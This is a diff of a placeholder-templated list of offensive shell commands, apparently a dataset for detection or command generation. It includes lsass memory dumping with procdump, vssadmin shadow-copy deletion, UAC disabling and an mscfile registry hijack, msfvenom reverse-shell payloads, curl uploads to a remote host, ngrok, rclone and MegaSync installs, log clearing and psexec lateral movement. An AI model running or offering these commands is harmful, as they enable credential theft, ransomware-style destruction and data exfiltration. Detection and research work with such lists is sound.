+psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+sdelete ${local_file_path}
+powershell -c "netstat -q"
+netstat.exe -q
+cmd /c "del /f ${local_file_path}"
+cmd /c "vssadmin Delete Shadows /all"
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+powershell -c "sdelete -s -q -accepteula ${local_file_path}"
+rm -fr ${local_file_path} 2> /dev/null
+nmap -F ${ip_address} 2> &1
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+nmap -sP ${ip_address} 2> &1
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
+choco install winscp
+cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> error.log
+cmd /c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+mstsc /v:${ip_address} /remoteGuard
+powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+rm -fr ${local_file_path} 2> &1
+powershell -c "del /p /q ${local_file_path}"
+powershell -c "choco install -y rclone"
+wmic.exe os get SystemDevice
+powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+cmd /c "del /f /q ${local_file_path}"
+cmd /c "ipconfig"
+powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}
+cmd /c "vssadmin.exe delete shadows /All /quiet"
+powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
+cmd /c "ipconfig /all"
+powershell -c "vssadmin delete shadows /All"
+certutil -encode -v error.txt encode.txt
+cmd /c "wmic.exe shadowcopy call create Volume=C:"
+Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+powershell -c "sdelete.exe -q ${local_file_path}"
+powershell -c "7z a -slp -p ${destination_file_path} ${source_file_path}"
+wmic os get Version
+choco install -y ngrok
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
+powershell -c "procdump -accepteula -mm lsass lsassdump.dmp"
+cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+mstsc /v:${ip_address} /public
+rm -f ${local_file_path}
+choco install ngrok
+powershell -c "arp.exe -a"
+cmd /c "del /q /f ${local_file_path}"
+cmd /c "choco install -f procdump"
+powershell -c "sdelete -s -accepteula ${local_file_path}"
+powershell -c "taskkill.exe /F /im ${process_name}"
+powershell -c "vssadmin delete shadows /all /Quiet"
+vssadmin.exe delete shadows /All /Quiet
+echo ${email_content} | sendmail ${username}@${domain} 2> error.log
+cmd /c "net stop ${service_name}"
+powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+cmd /c "del /p /q ${local_file_path}"
+cmd /c "procdump.exe -mm lsass.exe lsassdump.dmp"
+del /f /q ${local_file_path}
+del /f /p ${local_file_path}
+cmd /c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
+nmap --open ${ip_address}
+7z a ${destination_file_path} ${source_file_path} -p
+powershell -c "vssadmin.exe create shadow /for=C:"
+cmd /c "sdelete.exe -f -accepteula ${local_file_path}"
+cmd /c "mstsc /v:${ip_address} /public"
+cmd /c "wmic os get Caption,Version"
+cmd /c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
+powershell -c "arp -g"
+powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "taskkill /f /im ${process_name} /T"
+cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+cmd /c "taskkill.exe /F /im ${process_name}"
+nmap -A ${ip_address} 2> /dev/null
+wmic.exe os get Caption,Version
+certutil -encode -v -f error.txt encode.txt
+nmap -p- -sC -sV -O ${ip_address} 2> error.log
+nmap -p- -sC -sV -O -A ${ip_address} 2> /dev/null
+powershell -c "plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "sdelete -s -q -accepteula ${loal_file_path}"
+powershell -c "netstat -r"
+powershell -c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+nmap -sV ${ip_address} 2> &1
+cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
+powershell -c "mstsc.exe /v:${ip_address} /admin"
+cmd /c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "netstat -f"
+powershell -c "mstsc.exe /v:${ip_address} /public"
+plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+cmd /c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+choco install -f 7zip
+cmd /c "vssadmin delete shadows /all"
+powershell -c "choco install -y Megasync"
+nmap -A ${ip_address} 2> &1
+7z.exe a -p${password} ${destination_file_path} ${source_file_path}
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+powershell -c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
+powershell -c "plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+nmap -F ${ip_address}
+powershell -c "choco install -f procdump"
+powershell -c "rmdir /q /s ${local_file_path}"
+cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
+powershell -c "netstat.exe -q"
+powershell -c "choco install -y psexec"
+powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+powershell -c "mstsc /v:${ip_address} /f /restrictedAdmin"
+echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> &1
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
+wmic os get SystemDevice
+cmd /c "certutil -encode -Unicode -gmt -f error.txt encode.txt"
+cmd /c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+powershell -c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+certutil -encode -gmt -v -f error.txt encode.txt
+psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+choco install Megasync
+powershell -c "procdump -ma lsass.exe lsassdump.dmp"
+powershell -c "del /q /f ${local_file_path}"
+cmd /c "mstsc.exe /v:${ip_address} /remoteGuard"
+nmap -PN ${ip_address} 2> &1
+sdelete -q ${local_file_path}
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
+cmd /c "sdelete.exe -q -accepteula ${local_file_path}"
+powershell -c "vssadmin Delete Shadows /all /quiet"
+cmd /c "vssadmin Delete Shadows /All /quiet"
+powershell -c "ipconfig /renew"
+cmd /c "net.exe stop ${service_name}"
+7z.exe a -slp ${destination_file_path} ${source_file_path} -p
+Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+powershell -c "del ${local_file_path}"
+powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "mstsc /v:${ip_address} /remoteGuard"
+plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+powershell -c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+cmd /c "mstsc /v:${ip_address} /admin"
+cmd /c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
+wmic os get TotalVirtualMemorySize
+powershell -c "vssadmin.exe Delete Shadows /all"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+powershell -c "choco install -f ngrok"
+cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+del /p ${local_file_path}
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
+mstsc.exe /v:${ip_address} /f /admin
+powershell -c "sdelete -q ${local_file_path}"
+powershell -c "net stop ${service_name}"
+powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
+ssmtp ${username}@${domain} < mail.txt 2> error.log
+mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
+powershell -c "sdelete -s -q ${local_file_path}"
+Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> error.log
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
+sdelete.exe -q -accepteula ${local_file_path}
+msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "netstat.exe -f"
+vssadmin create shadow /for=C:
+powershell -c "sdelete -accepteula ${local_file_path}"
+powershell -c "arp.exe -g"
+cmd /c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "wmic os get CSName"
+procdump.exe -accepteula -mm lsass lsassdump.dmp
+mstsc.exe /v:${ip_address} /restrictedAdmin
+cmd /c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+powershell -c "vssadmin Delete Shadows /All"
+echo -e ${email_content} | ssmtp ${username}@${domain}
+cmd /c "tasklist.exe"
+powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+powershell -c "del /q /p ${local_file_path}"
+cmd /c "netstat -a"
+cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
+cmd /c "wmic.exe os get TotalVirtualMemorySize"
+powershell -c "choco install putty"
+psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+sdelete.exe -f -q ${local_file_path}
+cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+powershell -c "plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+powershell -c "procdump.exe -ma lsass lsassdump.dmp"
+cmd /c "vssadmin.exe Delete Shadows /all /quiet"
+choco install -y 7zip
+powershell -c "systeminfo"
+nmap -p- -sC -sV ${ip_address} 2> /dev/null
+powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+netstat -q
+cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+cmd /c "rmdir /s /q ${local_file_path}"
+powershell -c "wmic.exe os get CSName"
+cmd /c "vssadmin Delete Shadows /all /quiet"
+cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
+Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+cat email.txt | ssmtp ${username}@${domain} 2> /dev/null
+mstsc /v:${ip_address} /f /public
+cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+cmd /c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
+cmd /c "choco install -y procdump"
+plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+cmd /c "choco install -f rclone"
+cmd /c "certutil -encode ${source_file_path} ${destination_file_path}"
+cat email.txt | ssmtp ${username}@${domain}
+cmd /c "msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+7z.exe a -slt -p ${destination_file_path} ${source_file_path}
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+nmap -v ${ip_address}
+cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> &1
+wmic.exe os get Name
+powershell -c "wevtutil cl system"
+msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+vssadmin Delete Shadows /all /Quiet
+netstat.exe -r
+cmd /c "wmic.exe os get Name"
+nmap ${ip_address}
+cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+cmd /c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "choco install -y putty"
+msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+choco install -f rclone
+rm -fr ${local_file_path} 2> error.log
+mstsc.exe /v:${ip_address} /f /restrictedAdmin
+powershell -c "vssadmin.exe delete shadows /All /quiet"
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+powershell -c "systeminfo.exe"
+cmd /c "choco install -y Megasync"
+powershell -c "mstsc.exe /v:${ip_address}"
+cmd /c "choco install -y ngrok"
+procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+powershell -c "choco install -f Megasync"
+cmd /c "certutil -encode -Unicode -gmt error.txt encode.txt"
+cmd /c "sdelete.exe -s -accepteula ${local_file_path}"
+choco install psexec
+powershell -c "mstsc /v:${ip_address} /remoteGuard"
+powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p"
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+powershell -c "certutil -encode -Unicode -gmt -f error.txt encode.txt"
+cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+cmd /c "sdelete.exe -s -q -accepteula ${local_file_path}"
+powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+cmd /c "choco install 7zip"
+sdelete.exe -f -accepteula ${local_file_path}
+powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+cmd /c "ipconfig /allcompartments"
+nmap -v -A ${ip_address} 2> /dev/null
+cmd /c "taskkill.exe /im ${process_name} /T"
+powershell -c "wmic os get FreePhysicalMemory"
+cmd /c "del /q ${local_file_path}"
+cmd /c "sdelete.exe -s -q ${local_file_path}"
+cmd /c "procdump -ma lsass lsassdump.dmp"
+procdump.exe -ma lsass lsassdump.dmp
+powershell -c "procdump -accepteula -mm lsass.exe lsassdump.dmp"
+wevtutil clear-log application
+wmic.exe os get Caption
+cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+procdump.exe -ma lsass.exe lsassdump.dmp
+cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
+cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "net.exe stop ${service_name}"
+nmap -sC ${ip_address} 2> &1
+nmap -p- -sC -sV ${ip_address} 2> &1
+cmd /c "ipconfig.exe"
+powershell -c "plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+certutil -encode -Unicode -gmt -v error.txt encode.txt
+powershell -c "mstsc /v:${ip_address} /f /remoteGuard"
+plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
+powershell -c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
+cmd /c "sdelete.exe -f ${local_file_path}"
+echo -e ${email_content} | ssmtp ${username}@${domain} 2> error.log
+psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
+cmd /c "wmic.exe os get Caption,Version"
+cmd /c "plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+mstsc.exe /v:${ip_address}
+cmd /c "wevtutil clear-log system"
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "wmic.exe os get Version"
+cmd /c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "tasklist.exe"
+mstsc.exe /v:${ip_address} /public
+vssadmin.exe delete shadows /all /Quiet
+cmd /c "arp -g"
+mstsc.exe /v:${ip_address} /f /public
+powershell -c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
+echo -e ${email_content} | ssmtp ${username}@${domain} 2> &1
+powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
+cmd /c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
+curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
+curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
+cmd /c "vssadmin Delete Shadows /All"
+ipconfig /renew
+cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "mstsc /v:${ip_address} /f /restrictedAdmin"
+powershell -c "vssadmin delete shadows /All /Quiet"
+powershell -c "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+netstat -a
+wmic.exe os get FreePhysicalMemory
+powershell -c "sdelete.exe ${local_file_path}"
+echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
+procdump -accepteula -ma lsass lsassdump.dmp
+nmap -sP ${ip_address}
+netstat.exe -f
+powershell -c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+powershell -c "vssadmin.exe Delete Shadows /All"
+netstat
+nmap -sC ${ip_address} 2> error.log
+nmap -sP ${ip_address} 2> /dev/null
+certutil -encode -Unicode -v -f error.txt encode.txt
+powershell -c "netstat.exe -r"
+powershell -c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
+powershell -c "sdelete -s ${local_file_path}"
+cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+wmic os get FreePhysicalMemory
 ssmtp ${username}@${domain} < mail.txt 2> &1
 cmd /c "plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "certutil -encode -Unicode -gmt error.txt encode.txt"
-cmd /c "wmic.exe os get Name"
-powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
-cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-del /f ${local_file_path}
-cmd /c "sdelete -s -accepteula ${local_file_path}"
-powershell -c "vssadmin.exe Delete Shadows /all /quiet"
-7z a -slp -p${password} ${destination_file_path} ${source_file_path}
-cmd /c "mstsc /v:${ip_address} /public"
-cmd /c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-taskkill /im ${process_name}
-powershell -c "wmic os get CSName"
-cmd /c "sdelete -s ${local_file_path}"
-powershell -c "vssadmin.exe Delete Shadows /all"
-cmd /c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-choco install psexec
-cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-nmap -v ${ip_address} 2> &1
-rm -rf ${local_file_path} 2> /dev/null
-cmd /c "procdump -accepteula -ma lsass lsassdump.dmp"
-vssadmin delete shadows /All /Quiet
-powershell -c "net stop ${service_name}"
-powershell -c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> error.log
-powershell -c "vssadmin.exe Delete Shadows /All"
-powershell -c "vssadmin delete shadows /All /quiet"
-powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
-ipconfig.exe /allcompartments
-procdump.exe -mm lsass.exe lsassdump.dmp
-powershell -c "msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-rm -r ${local_file_path} 2> /dev/null
-cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
-nmap -sP ${ip_address} 2> &1
-curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-powershell -c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
-plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-mstsc.exe /v:${ip_address} /f /remoteGuard
-cmd /c "del /f /q ${local_file_path}"
-curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
-taskkill.exe /im ${process_name} /T
-powershell -c "choco install -y Megasync"
-cmd /c "certutil -encode -UnicodeText -f error.txt encode.txt"
-powershell -c "vssadmin.exe delete shadows /all /quiet"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-cmd /c "certutil -encode -Unicode -f error.txt encode.txt"
-cmd /c "sdelete.exe -q ${local_file_path}"
-curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
-taskkill /f /im ${process_name} /T
-psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-cmd /c "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-choco install -f Megasync
-cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "taskkill.exe /F /IM ${process_name}"
-powershell -c "ipconfig.exe /renew"
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}
-rm -fr ${local_file_path} 2> /dev/null
-cmd /c "wmic.exe os get Caption"
-powershell -c "procdump -mm lsass lsassdump.dmp"
-powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-powershell -c "mstsc.exe /v:${ip_address} /public"
-cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-cmd /c "ipconfig.exe /all"
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}
-cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> &1
-del /q /p ${local_file_path}
-choco install -y procdump
-powershell -c "certutil -encode -UnicodeText error.txt encode.txt"
-powershell -c "plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "arp -g"
-cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "certutil -encode -f ${source_file_path} ${destination_file_path}"
-cmd /c "7z a -slt -p ${destination_file_path} ${source_file_path}"
-powershell -c "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "vssadmin delete shadows /all /quiet"
-powershell -c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
-powershell -c "arp.exe -g"
-cmd /c "procdump -ma lsass lsassdump.dmp"
-cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
-psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-nmap -p- -sC ${ip_address}
-nmap -p- -sC ${ip_address} 2> /dev/null
-cmd /c "vssadmin Delete Shadows /All"
-cmd /c "mstsc.exe /v:${ip_address} /public"
-powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-powershell -c "procdump -accepteula -ma lsass lsassdump.dmp"
-vssadmin.exe delete shadows /All
-powershell -c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-wmic.exe shadowcopy call create Volume=C:
-cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-cmd /c "procdump.exe -mm lsass lsassdump.dmp"
-cmd /c "del /q /p ${local_file_path}"
-mstsc.exe /v:${ip_address}
-powershell -c "choco install -f Megasync"
